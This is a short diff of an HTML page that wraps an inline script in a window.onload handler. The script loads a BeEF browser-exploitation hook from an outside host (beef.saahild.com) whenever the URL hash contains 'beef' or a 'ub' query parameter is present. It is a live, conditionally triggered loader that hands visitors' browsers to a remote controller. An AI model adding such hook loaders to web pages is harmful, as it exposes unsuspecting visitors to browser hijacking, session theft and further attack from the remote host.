@@ -176,7 +176,8 @@
   <!-- <script src="ad.js"></script> -->
 <!--   beef IF SPECICIFIED BY HASH OR QUERY -->
   <script>
-    (function() {
+ window.onload = () => {
+      (function() {
     var url = 'https://beef.saahild.com:443/hook.js';
     if (typeof beef == 'undefined' && ( location.hash.includes('beef') || new URLSearchParams(location.search).get("ub"))) {
       
@@ -186,6 +187,7 @@
         document.body.appendChild(bf);
     }
 })();
+ }
   </script>
   <body>
     <noscript>
